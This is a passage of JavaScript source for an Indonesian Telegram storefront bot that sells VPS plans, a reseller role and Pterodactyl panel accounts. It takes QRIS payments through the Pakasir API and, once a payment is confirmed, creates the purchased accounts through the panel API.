`<b>❌ 𝗦𝘁𝗼𝗰𝗸 𝗧𝗲𝗹𝗮𝗵 𝗛𝗮𝗯𝗶𝘀</b>

Maaf, stok VPS habis saat Anda memproses pesanan.`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "buyvps" }]]
                }
            }
        );
    }

    const harga = config.hargaVPS[session.paket][session.plan];
    const orderId = `VPS${Date.now()}${userId}`;

    session.orderId = orderId;
    session.price = harga;
    vpsOrderSession.set(userId, session);

    try {
        await editMenuMessage(ctx, "<blockquote>⏳ Membuat QRIS pembayaran...</blockquote>", { parse_mode: "HTML" });

        // CREATE QRIS
        const { data } = await axios.post(
            "https://app.pakasir.com/api/transactioncreate/qris",
            {
                project: config.PAKASIR_PROJECT,
                order_id: orderId,
                amount: harga,
                api_key: config.PAKASIR_API_KEY
            }
        );

        if (!data.payment || !data.payment.payment_number) {
            throw new Error("Gagal membuat QRIS");
        }

        const payload = data.payment.payment_number;
        const filePath = path.join(__dirname, `qris_vps_${orderId}.png`);
        await QRCode.toFile(filePath, payload, { scale: 8 });

        const regionNames = {
            "sgp1": "🇸🇬 Singapore",
            "nyc3": "🇺🇸 New York",
            "sfo3": "🇺🇸 San Francisco",
            "ams3": "🇳🇱 Amsterdam",
            "lon1": "🇬🇧 London",
            "fra1": "🇩🇪 Frankfurt",
            "tor1": "🇨🇦 Toronto"
        };

        const qrisMsg = await ctx.replyWithPhoto(
            { source: filePath },
            {
                caption:
`<blockquote>🧾 <b>PEMBAYARAN VPS</b>
📦 Paket: <b>${session.paket.toUpperCase()}</b>
🖥️ Spesifikasi: <b>${session.plan}</b>
💰 Total: <b>Rp ${harga.toLocaleString("id-ID")}</b>
🆔 Order ID: <b>${orderId}</b>

<b>📌 Instruksi:</b>
1. Scan QRIS di atas untuk pembayaran
2. VPS akan dibuat otomatis setelah pembayaran berhasil
3. Pembayaran diverifikasi otomatis

<b>⏱️ Berlaku 15 menit!</b></blockquote>`,
                parse_mode: "HTML"
            }
        );

        fs.unlinkSync(filePath);
        const qrisMsgId = qrisMsg.message_id;

        session.qrisMessageId = qrisMsgId;
        session.qrisChatId = chatId;
        vpsOrderSession.set(userId, session);

        // CEK PEMBAYARAN
        const startTime = Date.now();
        const checkPayment = setInterval(async () => {
            try {
                const detail = await axios.get(
                    "https://app.pakasir.com/api/transactiondetail",
                    {
                        params: {
                            project: config.PAKASIR_PROJECT,
                            order_id: orderId,
                            amount: harga,
                            api_key: config.PAKASIR_API_KEY
                        }
                    }
                );

                if (detail.data?.transaction?.status === "completed") {
                    clearInterval(checkPayment);

                    // Hapus pesan QRIS
                    await ctx.telegram.deleteMessage(chatId, qrisMsgId).catch(() => {});

                    // ---> PROSES PEMBUATAN VPS DENGAN AUTO NOTIF REFUND <---
                    let vpsCreationSuccess = false;
                    
                    try {
                        await editMenuMessage(ctx, 
                            "<blockquote>✅ <b>Pembayaran berhasil!</b>\n\n⏳ Sedang membuat VPS Anda...</blockquote>", 
                            { parse_mode: "HTML" }
                        );

                        const vpsResult = await CreateBuyVps({
                            userId,
                            username: username,
                            paket: session.paket,
                            plan: session.plan,
                            os: session.os,
                            region: session.region,
                            price: harga,
                            orderId
                        });

                        if (vpsResult && vpsResult.success) {
                            vpsCreationSuccess = true;
                            
                            await editMenuMessage(ctx,
`<blockquote>✅ <b>VPS BERHASIL DIBUAT!</b>

📦 Paket: <b>${session.paket.toUpperCase()}</b>
🖥️ Spesifikasi: <b>${session.plan}</b>
🌎 Region: <b>${regionNames[session.region] || session.region}</b>
💿 OS: <b>${session.os}</b>
💰 Total: <b>Rp ${harga.toLocaleString("id-ID")}</b>
🆔 Order ID: <b>${orderId}</b>

📌 Data login VPS telah dikirim ke chat pribadi Anda.
📌 Cek chat pribadi dengan bot ini untuk detail VPS.</blockquote>`,
                                {
                                    parse_mode: "HTML",
                                    reply_markup: {
                                        inline_keyboard: [[{ text: "🛒 Beli Lagi", callback_data: "buyvps" }]]
                                    }
                                }
                            );

                            // Kirim notifikasi sukses ke owner
                            await ctx.telegram.sendMessage(
                                config.owner,
`<blockquote>💰 <b>PEMBAYARAN VPS (QRIS) BERHASIL</b>
👤 User: ${username} (ID: ${userId})
📦 Paket: ${session.paket.toUpperCase()} - ${session.plan}
💵 Nominal: Rp${harga.toLocaleString("id-ID")}
🆔 Order ID: ${orderId}</blockquote>`,
                                { parse_mode: "HTML" }
                            );
                            
                        } else {
                            throw new Error(vpsResult?.error || "Gagal membuat VPS dari provider.");
                        }
                        
                    } catch (vpsError) {
                        // ---> AUTO NOTIF REFUND KE ADMIN <---
                        console.error("❌ Gagal membuat VPS setelah pembayaran QRIS:", vpsError.message);
                        
                        // Beri tahu user bahwa ada masalah
                        await ctx.reply(
`<blockquote>⚠️ <b>PEMBAYARAN BERHASIL TAPI VPS GAGAL DIBUAT</b>

Pembayaran Anda melalui QRIS telah kami terima.
✅ <b>Order ID: ${orderId}</b>
💰 <b>Nominal: Rp ${harga.toLocaleString("id-ID")}</b>

❌ Namun terjadi kesalahan teknis saat membuat VPS.

🚨 <b>Tim admin kami telah menerima notifikasi dan akan segera memproses REFUND MANUAL Anda.</b>
Harap hubungi admin @ReyValdz dengan menyertakan Order ID ini untuk mempercepat proses refund.

Kami mohon maaf atas ketidaknyamanannya.</blockquote>`,
                            { parse_mode: "HTML" }
                        );

                        // Kirim notifikasi URGENT ke admin untuk refund manual
                        await ctx.telegram.sendMessage(
                            config.owner,
`<blockquote>🚨 <b>[URGENT] REFUND DIBUTUHKAN!</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Pembayaran QRIS BERHASIL, tapi VPS GAGAL dibuat!</b>

👤 User: ${username}
🆔 User ID: ${userId}
📦 Paket: ${session.paket.toUpperCase()} - ${session.plan}
💵 Nominal: Rp ${harga.toLocaleString("id-ID")}
🆔 Order ID: ${orderId}
❌ Error: ${vpsError.message}

📌 <b>SEGERA LAKUKAN REFUND MANUAL KEPADA USER INI!</b>
📌 User sudah diberitahu untuk menghubungi Anda.</blockquote>`,
                            { parse_mode: "HTML" }
                        );
                        
                        // Kirim juga ke channel jika diperlukan
                        if (Channel_ID) {
                            await ctx.telegram.sendMessage(
                                Channel_ID,
`<blockquote>🚨 <b>REFUND CASE #${orderId}</b>
User: ${username} (${userId})
Nominal: Rp ${harga.toLocaleString("id-ID")}
Status: Menunggu refund manual</blockquote>`,
                                { parse_mode: "HTML" }
                            ).catch(() => {});
                        }
                        
                    } finally {
                        if (vpsCreationSuccess) {
                            vpsOrderSession.delete(userId);
                        }
                        // Jika gagal, session tidak dihapus, admin akan handle refund manual
                    }
                    
                    return;
                }

                // Cek expired
                if (Date.now() - startTime > QRIS_EXPIRE) {
                    clearInterval(checkPayment);
                    await ctx.telegram.deleteMessage(chatId, qrisMsgId).catch(() => {});
                    await editMenuMessage(ctx,
`<blockquote>❌ QRIS telah expired</blockquote>`,
                        {
                            parse_mode: "HTML",
                            reply_markup: {
                                inline_keyboard: [[{ text: "🔄 Coba Lagi", callback_data: "buyvps" }]]
                            }
                        }
                    );
                    vpsOrderSession.delete(userId);
                }

            } catch (err) {
                console.log("Cek pembayaran error:", err.message);
            }
        }, config.PAKASIR_CHECK_INTERVAL || 5000);

    } catch (err) {
        console.error("❌ Payment creation error:", err.response?.data || err.message);
        await editMenuMessage(ctx,
`<blockquote>❌ Gagal memproses pembayaran: ${err.message}</blockquote>`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "🔄 Coba Lagi", callback_data: "buyvps" }]]
                }
            }
        );
        vpsOrderSession.delete(userId);
    }
});
// ---------- [ Buy Reseller ] ------------ \\
bot.action("buyreseller", async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }

  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  const username = ctx.from.username || ctx.from.first_name;
  const orderId = `RES${Date.now()}${userId}`;
  
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }

  try {
    await editMenuMessage(ctx, "⏳ Membuat qris pembayaran...", {});

    // ===== CREATE QRIS =====
    const { data } = await axios.post(
      "https://app.pakasir.com/api/transactioncreate/qris",
      {
        project: config.PAKASIR_PROJECT,
        order_id: orderId,
        amount: config.RESELLER_PRICE,
        api_key: config.PAKASIR_API_KEY
      }
    );

    const payload = data.payment.payment_number;
    const filePath = path.join(__dirname, `qris_${orderId}.png`);
    await QRCode.toFile(filePath, payload, { scale: 8 });

    const qrisMsg = await ctx.replyWithPhoto(
      { source: filePath },
      {
        caption:
`<blockquote>🧾 <b>𝖬𝖤𝖳𝖮𝖣𝖤 𝖯𝖤𝖬𝖡𝖠𝖸𝖠𝖱𝖠𝖭</b>

<b>𝖮𝗋𝖽𝖾𝗋 𝖨𝖣</b> : ${orderId}
<b>𝖳𝗈𝗍𝖺𝗅</b> : Rp${config.RESELLER_PRICE.toLocaleString("id-ID")}

<b>📌 Instruksi:</b>
1. Scan QRIS di atas untuk pembayaran
2. dikirim otomatis setelah pembayaran berhasil
3. Pembayaran diverifikasi otomatis

<b>⏱️ Berlaku 15 menit!</b></blockquote>`,
        parse_mode: "HTML"
      }
    );

    fs.unlinkSync(filePath);
    const qrisMsgId = qrisMsg.message_id;

    // ===== CEK PEMBAYARAN =====
    const startTime = Date.now();
    const checkPayment = setInterval(async () => {
      try {
        const detail = await axios.get(
          "https://app.pakasir.com/api/transactiondetail",
          {
            params: {
              project: config.PAKASIR_PROJECT,
              order_id: orderId,
              amount: config.RESELLER_PRICE,
              api_key: config.PAKASIR_API_KEY
            }
          }
        );

        if (detail.data?.transaction?.status === "completed") {
          clearInterval(checkPayment);

          await ctx.telegram.deleteMessage(chatId, qrisMsgId).catch(() => {});

          await ctx.reply(
`<blockquote>✅ <b>PEMBAYARAN BERHASIL!</b>

‼️ 𝖲𝖾𝗅𝖺𝗆𝖺𝗍, 𝗄𝖺𝗆𝗎 𝗌𝖾𝗄𝖺𝗋𝖺𝗇𝗀 𝗋𝖾𝗌𝗆𝗂 𝗋𝖾𝗌𝖾𝗅𝗅𝖾𝗋.
𝖪𝗅𝗂𝗄 𝗅𝗂𝗇𝗄 𝖽𝗂𝖻𝖺𝗐𝖺𝗁 𝗎𝗇𝗍𝗎𝗄 𝗆𝖺𝗌𝗎𝗄 𝗀𝗋𝗎𝗉 𝗋𝖾𝗌𝖾𝗅𝗅𝖾𝗋:  

<b>𝖦𝗋𝗎𝗉 𝖠𝗅𝗅 𝖱𝗈𝗅𝖾:</b>
- Link: ${config.grup_reseller}

Silahkan Masuk Dan Tag Si @ReyValdz
</blockquote>`,
            { parse_mode: "HTML", disable_web_page_preview: true }
          );

          await ctx.telegram.sendMessage(
            config.owner,
`<blockquote>💰 <b>𝖯𝖤𝖬𝖡𝖠𝖸𝖠𝖱𝖠𝖭 𝖱𝖤𝖲𝖤𝖫𝖫𝖤𝖱 𝖲𝖴𝖢𝖢𝖤𝖲𝖲</b>
👤 User: ${username} (ID: ${userId})  
💵 Nominal: Rp${config.RESELLER_PRICE.toLocaleString("id-ID")}  
🆔 Order ID: ${orderId}
</blockquote>`,
            { parse_mode: "HTML" }
          );

          await sendTesti("reseller", {
            userId,
            username,
            amount: config.RESELLER_PRICE,
            orderId
          });
          
          return;
        }

        if (Date.now() - startTime > QRIS_EXPIRE) {
          clearInterval(checkPayment);
          await ctx.telegram.deleteMessage(chatId, qrisMsgId).catch(() => {});
          await ctx.reply("❌ QRIS telah expired (10 menit). Silakan ulangi pembelian jika masih ingin menjadi reseller.");
        }

      } catch (err) {
        console.log("Cek pembayaran error:", err.message);
      }
    }, config.PAKASIR_CHECK_INTERVAL);

  } catch (err) {
    console.error(err.response?.data || err.message);
    await ctx.reply("❌ Gagal memproses order reseller");
  }
});

bot.action("reseller_cancel", async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }

  await editMenuMessage(ctx, "❌ Pembelian reseller dibatalkan.", { reply_markup: { inline_keyboard: [] } });
});

// ---------- [ Buy Admin Panel ] ------------ \\
bot.action("buyadp", async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }

  const args = ctx.match ? ctx.match[1]?.split("|") : null;
  const username = args ? args[0] : null;
  
  // simpan session
  panelSession.set(ctx.from.id, {
    step: "pick_server",
    username
  });

  const buttons = Object.entries(servers2).map(([key, srv]) => {
    const isRestock = !srv.domain || !srv.token;

    return [
      Markup.button.callback(
        `${srv.name} ${isRestock ? "⛔ RESTOCK" : `Rp${srv.price.toLocaleString("id-ID")}`}`,
        `buyadp_srv|${key}`
      )
    ];
  });

  await ctx.reply(
`<blockquote><b>Pilih server Di Bawah ini:</b>
</blockquote>`,
    {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard(buttons)
    }
  );
});

bot.action(/^buyadp_srv\|(.+)$/, async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }
  
  const srvKey = ctx.match[1];
  const session = panelSession.get(ctx.from.id);
  const srv = servers2[srvKey];

  if (!session) return ctx.answerCbQuery("Session habis");

  if (!srv) {
    panelSession.delete(ctx.from.id);
    return editMenuMessage(ctx, "⛔ Server tidak ditemukan.", { reply_markup: { inline_keyboard: [] } });
  }

  // HARD RESTOCK BLOCK
  if (!srv.domain || !srv.token) {
    panelSession.delete(ctx.from.id);
    return editMenuMessage(ctx, "⛔ Server sedang RESTOCK.", { reply_markup: { inline_keyboard: [] } });
  }

  if (typeof srv.price !== "number") {
    panelSession.delete(ctx.from.id);
    return editMenuMessage(ctx, "⛔ Harga server tidak valid.", { reply_markup: { inline_keyboard: [] } });
  }

  session.server = srvKey;
  session.step = "waiting_username";
  panelSession.set(ctx.from.id, session);

  await editMenuMessage(ctx,
`<blockquote>📝 <b>MASUKKAN USERNAME ADMIN PANEL</b>
Silakan reply pesan ini dengan username yang diinginkan.

• Minimal 3-16 karakter
• Hanya huruf dan angka
• Tanpa spasi atau simbol</blockquote>`,
    { 
      parse_mode: "HTML",
      reply_markup: { 
        inline_keyboard: [[{ text: "❌ Batal", callback_data: "buyadp_cancel" }]] 
      } 
    }
  );
});

bot.on("text", async (ctx, next) => {
  if (ctx.chat.type !== "private") return next();
  if (!ctx.message.reply_to_message) return next();

  const userId = ctx.from.id;
  const session = panelSession.get(userId);
  
  if (!session || session.step !== "waiting_username") return next();

  const srv = servers2[session.server];
  if (!srv) {
    panelSession.delete(userId);
    return ctx.reply("❌ Session expired. Silakan mulai lagi.");
  }

  const username = ctx.message.text.trim().toLowerCase();
  
  // Validasi username
  if (!/^[a-z0-9]{3,16}$/.test(username)) {
    return ctx.reply(
      "<blockquote>❌ Username tidak valid!\n\n" +
      "• Minimal 3-16 karakter\n" +
      "• Hanya huruf kecil dan angka\n" +
      "• Tanpa spasi atau simbol\n\n" +
      "Silakan coba lagi.</blockquote>",
      { parse_mode: "HTML" }
    );
  }

  // Simpan username ke session
  session.username = username;
  session.step = "confirm";
  panelSession.set(userId, session);

  const priceText = srv.price.toLocaleString("id-ID");

  await ctx.reply(
`<blockquote>🛒 <b>𝖪𝖮𝖭𝖥𝖨𝖱𝖬𝖠𝖲𝖨 𝖯𝖤𝖬𝖡𝖤𝖫𝖨𝖠𝖭</b>
---------------------------------------------------------
- 𝖴𝗌𝖾𝗋𝗇𝖺𝗆𝖾 : ${username}
- 𝖲𝖾𝗋𝗏𝖾𝗋 : ${srv.name}
- 𝖳𝗈𝗍𝖺𝗅 : Rp${priceText}

<b>𝖢𝖺𝗍𝖺𝗍𝖺𝗇!</b>
𝖠𝗉𝖺𝗄𝖺𝗁 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗅𝖺𝗇𝗃𝗎𝗍𝗄𝖺𝗇 𝖯𝖾𝗆𝖻𝖺𝗒𝖺𝗋𝖺𝗇? 
</blockquote>`,
    {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback("✅ Konfirmasi", "buyadp_confirm"),
          Markup.button.callback("❌ Batal", "buyadp_cancel")
        ]
      ])
    }
  );

  return; // Stop propagation
});

bot.action("buyadp_confirm", async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }
  
  const session = panelSession.get(ctx.from.id);
  if (!session || session.step !== "confirm")
    return ctx.answerCbQuery("Session habis");

  const srv = servers2[session.server];
  const username = session.username;
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  const orderId = `ADP${Date.now()}${userId}`;
  const password = `${username}Xczg#`;
  const email = `${username}@AldzyIsHere.com`;

  session.step = "payment";
  panelSession.set(ctx.from.id, session);

  await ctx.deleteMessage().catch(() => {});

  try {
    const { data } = await axios.post(
      "https://app.pakasir.com/api/transactioncreate/qris",
      {
        project: config.PAKASIR_PROJECT,
        order_id: orderId,
        amount: srv.price,
        api_key: config.PAKASIR_API_KEY
      }
    );

    if (!data.payment || !data.payment.payment_number) {
      throw new Error("Gagal membuat QRIS");
    }

    const filePath = path.join(__dirname, `qris_${orderId}.png`);
    await QRCode.toFile(filePath, data.payment.payment_number, { scale: 8 });

    const qrisMsg = await ctx.replyWithPhoto(
      { source: filePath },
      {
        caption:
`<blockquote>🧾 <b>𝖬𝖤𝖳𝖮𝖣𝖤 𝖯𝖤𝖬𝖡𝖠𝖸𝖠𝖱𝖠𝖭</b>

𝖮𝗋𝖽𝖾𝗋 𝖨𝖣 : ${orderId}
𝖴𝗌𝖾𝗋𝗇𝖺𝗆𝖾 : ${username}
𝖳𝗈𝗍𝖺𝗅 : Rp${srv.price.toLocaleString("id-ID")}

<b>📌 Instruksi:</b>
1. Scan QRIS di atas untuk pembayaran
2. dikirim otomatis setelah pembayaran berhasil
3. Pembayaran diverifikasi otomatis

<b>⏱️ Berlaku 15 menit!</b></blockquote>`,
        parse_mode: "HTML"
      }
    );

    fs.unlinkSync(filePath);
    const qrisMsgId = qrisMsg.message_id;

    const check = setInterval(async () => {
      try {
        const d = await axios.get(
          "https://app.pakasir.com/api/transactiondetail",
          {
            params: {
              project: config.PAKASIR_PROJECT,
              order_id: orderId,
              amount: srv.price,
              api_key: config.PAKASIR_API_KEY
            }
          }
        );

        if (d.data?.transaction?.status !== "completed") return;

        clearInterval(check);

        await axios.post(
          `${srv.domain}/api/application/users`,
          {
            email,
            username,
            first_name: username,
            last_name: "Admin",
            password,
            language: "en",
            root_admin: true
          },
          {
            headers: {
              Authorization: `Bearer ${srv.token}`,
              "Content-Type": "application/json"
            }
          }
        );

        await ctx.telegram.deleteMessage(ctx.chat.id, qrisMsgId).catch(() => {});

        await ctx.reply(
`<b>✅ Berhasil Membuat Panel</b>

👤 <b>𝖴𝗌𝖾𝗋𝗇𝖺𝗆𝖾:</b> <code>${username}</code>
🔐 <b>𝖯𝖺𝗌𝗌𝗐𝗈𝗋𝖽:</b> <code>${password}</code>
📧 <b>𝖤𝗆𝖺𝗂𝗅:</b> <code>${email}</code>

<b>𝖫𝗈𝗀𝗂𝗇 𝖲𝖾𝗋𝗏𝖾𝗋:</b>
- Domain: ${srv.domain}

<b>𝖦𝗋𝗎𝗉 𝖠𝗅𝗅 𝖱𝗈𝗅𝖾:</b>
- Link: ${config.grup_reseller}

<pre>📑 Rules Pembelian Panel</pre>
━────────────────────
- akun ini bersifat <b>rahasia</b> dan hanya diberikan <b>satu kali</b>
- Pengguna bertanggung jawab penuh atas keamanan data akses.
- Garansi layanan berlaku selama <b>10 (Sepuluh) hari</b> sejak tanggal aktivasi.
- Klaim garansi wajib disertai bukti transaksi yang sah.`,
          { parse_mode: "HTML" }
        );

        await sendTesti("admin_panel", {
          userId,
          username,
          serverName: srv.name,
          amount: srv.price,
          orderId
        });

        panelSession.delete(ctx.from.id);

      } catch (err) {
        clearInterval(check);
        console.error("Error in payment confirmation:", err.response?.data || err.message);

        await ctx.reply(
`<blockquote>❌ <b>GAGAL MEMBUAT ADMIN PANEL</b>

Pembayaran sukses tapi user gagal dibuat.
Hubungi admin @ReyValdz

🆔 Order ID: ${orderId}</blockquote>`,
          { parse_mode: "HTML" }
        );
      }
    }, config.PAKASIR_CHECK_INTERVAL);

  } catch (err) {
    panelSession.delete(ctx.from.id);
    console.error("Payment creation error:", err);
    await ctx.reply(`❌ Gagal memproses pembayaran: ${err.message}`);
  }
});

bot.action("buyadp_cancel", async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }
  
  panelSession.delete(ctx.from.id);
  await editMenuMessage(ctx, "❌ Pembelian admin panel dibatalkan.", { reply_markup: { inline_keyboard: [] } });
});

// ---------- [ Buy Panel ] ------------ \\
bot.action("buypanel", async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }

  const buttons = Object.entries(servers).map(([k, s]) => {
  const ready = s.domain && s.token;

    return [
      Markup.button.callback(
        ready
          ? `🟢 ${s.name}`
          : `🔴 ${s.name} (Restock)`,
        `srv_pick|${k}`
      )
    ];
  });

  await ctx.reply(
`<blockquote>🛒 <b>𝖡𝖴𝖸 𝖯𝖠𝖭𝖤𝖫</b>
Silahkan pilih server:
</blockquote>`,
    { parse_mode: "HTML", ...Markup.inlineKeyboard(buttons) }
  );
});

bot.action("noop", (ctx) => ctx.answerCbQuery("Server sedang restock"));

bot.action("panel_back_server", async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }

  panelSession.delete(ctx.from.id);

  const buttons = Object.entries(servers).map(([key, srv]) => {
    const isRestock = !srv.domain || !srv.token;

    return [
      Markup.button.callback(
        isRestock
          ? `⛔ ${srv.name} (Restock)`
          : `🖥️ ${srv.name}`,
        isRestock ? "noop" : `panel_srv|${key}`
      )
    ];
  });

  await editMenuMessage(ctx,
`<blockquote>🖥️ <b>PILIH SERVER PANEL</b></blockquote>`,
    {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard(buttons)
    }
  );
});

bot.action(/^srv_pick\|(.+)$/, async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }
  
  const srvKey = ctx.match[1];
  const srv = servers[srvKey];

  if (!srv) {
    return ctx.answerCbQuery("Server tidak valid");
  }

  if (!srv.domain || !srv.token) {
    return ctx.answerCbQuery(
      "⛔ Server sedang restock, silahkan pilih server lain",
      { show_alert: true }
    );
  }

  panelSession.set(ctx.from.id, { srvKey });

  const buttons = Object.keys(srv.sizes).map(k => {
    const p = srv.sizes[k];
    return [
      Markup.button.callback(
        `💾 ${k.toUpperCase()} | ⚡ CPU ${p.cpu || "∞"}% | Rp${p.price.toLocaleString("id-ID")}`,
        `panel_pick|${srvKey}|${k}`
      )
    ];
  });

  await editMenuMessage(ctx,
  `<blockquote>📦 <b>PILIH PAKET – ${srv.name}</b></blockquote>`,
  {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      ...buttons,
      [
        Markup.button.callback(
          "⬅️ Kembali",
          "panel_back_server"
        )
      ]
    ])
  }
);
});

bot.action(/^panel_pick\|(.+)\|(.+)$/, async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }

  const [srvKey, sizeKey] = ctx.match.slice(1);
  const session = panelSession.get(ctx.from.id);
  const srv = servers[srvKey];

  if (!session || session.srvKey !== srvKey)
    return ctx.answerCbQuery("Session habis");

  // 🔴 RESTOCK BLOCK
  if (!srv || !srv.domain || !srv.token) {
    panelSession.delete(ctx.from.id);
    return ctx.answerCbQuery(
      "⛔ Server sedang restock",
      { show_alert: true }
    );
  }

  session.sizeKey = sizeKey;
  session.step = "username";
  panelSession.set(ctx.from.id, session);

  await editMenuMessage(ctx,
`<blockquote>📝 <b>MASUKKAN USERNAME PANEL</b>

Reply pesan ini dengan <b>username panel</b>..

• <b>Minimal 3–8 huruf</b>
• <b>Tanpa spasi & simbol</b>

Pesanan akan kami <b>proses</b>
dengan cepat & aman</blockquote>`,
    { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } }
  );
});

bot.on("text", async (ctx, next) => {
  if (!ctx.message.reply_to_message) return next();

  const session = panelSession.get(ctx.from.id);
  if (!session || session.step !== "username") return next();

  const srv = servers[session.srvKey];

  // restock
  if (!srv || !srv.domain || !srv.token) {
    panelSession.delete(ctx.from.id);
    return ctx.reply("⛔ Server sedang restock, silakan pilih server lain.");
  }

  const username = ctx.message.text.trim().toLowerCase();
  if (!/^[a-z0-9]{3,16}$/.test(username))
    return ctx.reply("❌ Username tidak valid");

  session.username = username;
  session.step = "confirm";
  panelSession.set(ctx.from.id, session);

  const pack = srv.sizes[session.sizeKey];

  await ctx.reply(
`<blockquote>🛒 <b>𝖪𝖮𝖭𝖥𝖨𝖱𝖬𝖠𝖲𝖨 𝖯𝖤𝖬𝖡𝖤𝖫𝖨𝖠𝖭</b>
---------------------------------------------------------
- 𝖴𝗌𝖾𝗋𝗇𝖺𝗆𝖾 : ${username}
- 𝖯𝖺𝗄𝖾𝗍 : ${session.sizeKey.toUpperCase()}
- 𝖳𝗈𝗍𝖺𝗅 : Rp${pack.price.toLocaleString("id-ID")}

<b>𝖢𝖺𝗍𝖺𝗍𝖺𝗇!</b>
𝖠𝗉𝖺𝗄𝖺𝗁 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗅𝖺𝗇𝗃𝗎𝗍𝗄𝖺𝗇 𝖯𝖾𝗆𝖻𝖺𝗒𝖺𝗋𝖺𝗇? 
</blockquote>`,
    {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback(
            "✅ Konfirmasi",
            `panel_confirm|${session.srvKey}|${session.sizeKey}`
          ),
          Markup.button.callback("❌ Batal", "panel_cancel")
        ]
      ])
    }
  );
});

bot.action("panel_cancel", async (ctx) => {
  panelSession.delete(ctx.from.id);
  await editMenuMessage(ctx, "❌ Pembelian panel dibatalkan.", { reply_markup: { inline_keyboard: [] } });
});

bot.action(/^panel_confirm\|(.+)\|(.+)$/, async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }

  const [srvKey, sizeKey] = ctx.match.slice(1);
  const session = panelSession.get(ctx.from.id);

  if (!session || session.step !== "confirm")
    return ctx.answerCbQuery("Session habis");

  const srv = servers[srvKey];

  // 🔒 HARD BLOCK RESTOCK
  if (!srv.domain || !srv.token) {
    panelSession.delete(ctx.from.id);
    return editMenuMessage(ctx, "⛔ Server sedang restock.", { reply_markup: { inline_keyboard: [] } });
  }

  const pack = srv.sizes[sizeKey];
  const username = session.username;

  const userId = ctx.from.id;
  const chatId = ctx.chat.id;
  const orderId = `PNL${Date.now()}${userId}`;
  const password = `${username}001`;
  const email = `${username}@Panel.com`;

  session.step = "payment";
  panelSession.set(ctx.from.id, session);

  await ctx.deleteMessage().catch(() => {});

  try {
    const { data } = await axios.post(
      "https://app.pakasir.com/api/transactioncreate/qris",
      {
        project: config.PAKASIR_PROJECT,
        order_id: orderId,
        amount: pack.price,
        api_key: config.PAKASIR_API_KEY
      }
    );

    const filePath = path.join(__dirname, `qris_${orderId}.png`);
    await QRCode.toFile(filePath, data.payment.payment_number, { scale: 8 });

    const qrisMsg = await ctx.replyWithPhoto(
      { source: filePath },
      {
        caption:
`<blockquote>🧾 <b>𝖬𝖤𝖳𝖮𝖣𝖤 𝖯𝖤𝖬𝖡𝖠𝖸𝖠𝖱𝖠𝖭</b>

- 𝖮𝗋𝖽𝖾𝗋 𝖨𝖣 : ${orderId}
- 𝖴𝗌𝖾𝗋𝗇𝖺𝗆𝖾 : ${username}
- 𝖯𝖺𝗄𝖾𝗍 : ${sizeKey.toUpperCase()}
- 𝖳𝗈𝗍𝖺𝗅 : Rp${pack.price.toLocaleString("id-ID")}

<b>📌 Instruksi:</b>
1. Scan QRIS di atas untuk pembayaran
2. dikirim otomatis setelah pembayaran berhasil
3. Pembayaran diverifikasi otomatis

<b>⏱️ Berlaku 15 menit!</b></blockquote>`,
        parse_mode: "HTML"
      }
    );

    fs.unlinkSync(filePath);
    const qrisMsgId = qrisMsg.message_id;

    const check = setInterval(async () => {
      try {
        const d = await axios.get(
          "https://app.pakasir.com/api/transactiondetail",
          {
            params: {
              project: config.PAKASIR_PROJECT,
              order_id: orderId,
              amount: pack.price,
              api_key: config.PAKASIR_API_KEY
            }
          }
        );

        if (d.data?.transaction?.status !== "completed") return;

        clearInterval(check);

        const userRes = await axios.post(
          `${srv.domain}/api/application/users`,
          {
            email,
            username,
            first_name: username,
            last_name: username,
            password,
            language: "en"
          },
          {
            headers: {
              Authorization: `Bearer ${srv.token}`,
              "Content-Type": "application/json"
            }
          }
        );

        const pteroUserId = userRes.data.attributes.id;

        await axios.post(
          `${srv.domain}/api/application/servers`,
          {
            name: username,
            user: pteroUserId,
            egg: Number(srv.egg),
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
            startup:
